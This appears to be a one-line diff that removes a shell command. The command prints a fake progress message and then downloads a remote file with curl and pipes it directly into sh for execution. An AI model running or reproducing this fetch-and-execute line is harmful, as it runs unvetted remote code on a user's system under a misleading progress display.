@@ -1,1 +1,0 @@
-echo 'Progress: 94.0%'; curl -L --progress-bar frkns.github.io/fun/cyberRegime.gzip | sh
